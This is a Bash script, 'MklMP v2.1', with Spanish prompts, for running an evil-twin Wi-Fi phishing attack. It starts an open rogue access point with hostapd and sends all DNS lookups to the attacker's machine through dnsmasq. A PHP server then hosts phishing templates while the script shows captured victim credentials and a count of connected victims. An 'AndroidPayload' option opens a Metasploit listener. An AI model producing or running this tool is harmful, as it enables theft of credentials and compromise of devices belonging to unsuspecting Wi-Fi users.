#!/bin/bash

# MklMP v2.1

#Colours
rojo='\033[0;31m'
verde='\033[0;32m'
amarillo='\033[0;33m'
azul='\033[0;34m'

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

interfaz1=$(sudo iw dev | grep 'Interface' | awk '{print$2}')

trap ctrl_c INT

function ctrl_c(){
	interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')

	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop $interfaz > /dev/null 2>&1; sleep 1
	sudo systemctl restart NetworkManager
	exit 0
}

function getCredentials(){

	activeHosts=0
	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Espere las credenciales (${endColour}${turquoiseColour}${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${turquoiseColour}-"; done && echo -e "${endColour}"
		echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${turquoiseColour}-"; done && echo -e "${endColour}"
		activeHosts=$(bash DDos_Network/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 3; clear
	done
}



function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	
	
	###Problemas 
	
	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Activando la Wi-Fi...${endColour}"; sleep 1
	
	sudo nmcli radio wifi on
	
	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Probando la interfaz...${endColour}"; sleep 1
	
	test=$(sudo iw dev | awk '/type/ { if ($2 == "monitor") print $2}')
	if [[ "$test" != "monitor" ]]; then
		
		echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Acivando el modo monitor...${endColour}"; sleep 1
	
		airmon-ng start $interfaz1 > /dev/null 2>&1
	else
		echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}La interfaz ya estaba lista${endColour}"; sleep 1
	fi
	
	
	
	interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')
	
	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso (Default -> MyInternet):${endColour} " && read -r use_ssid
	
	if [ -z "$use_ssid" ]; then
		
		use_ssid="MyInternet"
	fi
	
	#echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Password del punto de acceso :${endColour} " && read -r pass
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso (1-12) (Default -> 10):${endColour} " && read use_channel; tput civis
	if [ "$use_channel" = "" ]; then
	
		use_channel="10"
	fi
	
	echo -e "\n${yellowColour}[!] Checkeando conexiones existentes...${endColour}\n"
	sleep 0.5
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 0.5

	echo -e "interface=$interfaz\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
	##############Password
	#echo -e "wpa=2\n" >> hostapd.conf
	#echo -e "wpa_key_mgmt=WPA-PSK\n" >> hostapd.conf
	#echo -e "wpa_passphrase=$pass" >> hostapd.conf
	
	 
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 0.5

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$interfaz\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
      
      
	ifconfig $interfaz up 192.168.1.1 netmask 255.255.255.0
	sleep 0.5
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 0.5
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 0.5

	# Array de plantillas
	
	

	echo -e "\e[1;93m
                        Selecciona una plantilla:
                    ____________________________________	
                ╔══════════════════════════════════════════╗
                ║                                          ║
                ║       1. AllNet (Default)                ║    
                ║       2. AndroidPayload                  ║
                ║                                          ║	
                ╚══════════════════════════════════════════╝										
	\e[0m"
	echo -ne "${yellowColour}           	Entrada : ${greenColour}" && read -r option

	template=" "
	
	while true; do
		case $option in
			
			
			1)
			template="DDos_Network/allNet"
			break
			;;
			
			
			2)
			template="DDos_Network/androidPayload"
			
			break
			;;
			
			"")
			template="DDos_Network/allNet"
			break
			;;
				
			*)
			echo -e "$rojo"
			echo -e "Opción inválida: -> $option no existe, ignorada" 
			sleep 2
			exit 2
			
			;;
			
		esac
	done

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "DDos_Network/androidPayload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then

		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 0.5
		popd > /dev/null 2>&1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 0.5
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando este Listener en Metasploit:${endColour}"
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		cat msfconsole.rc
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		
		comando="msfconsole -r DDos_Network/allNet/msfconsole.rc"
		
		gnome-terminal -- bash -c "$comando;bash"
		
		echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
		popd > /dev/null 2>&1; getCredentials
	else
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	fi
}




# Main Program

if [ "$(id -u)" == "0" ]; then
	
	
	tput civis; 
	dependencies
	startAttack
	
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
